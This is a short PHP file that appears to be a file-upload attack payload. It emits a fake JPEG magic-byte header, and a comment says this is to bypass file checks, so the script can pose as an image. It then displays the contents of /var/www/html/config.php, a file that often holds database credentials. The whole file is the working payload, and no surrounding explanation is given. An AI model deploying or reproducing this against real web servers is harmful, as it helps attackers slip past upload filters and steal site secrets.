<?php
/* Fake JPEG header to bypass file checks */
echo "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x02";

// Read and highlight config.php
highlight_file('/var/www/html/config.php');
?>
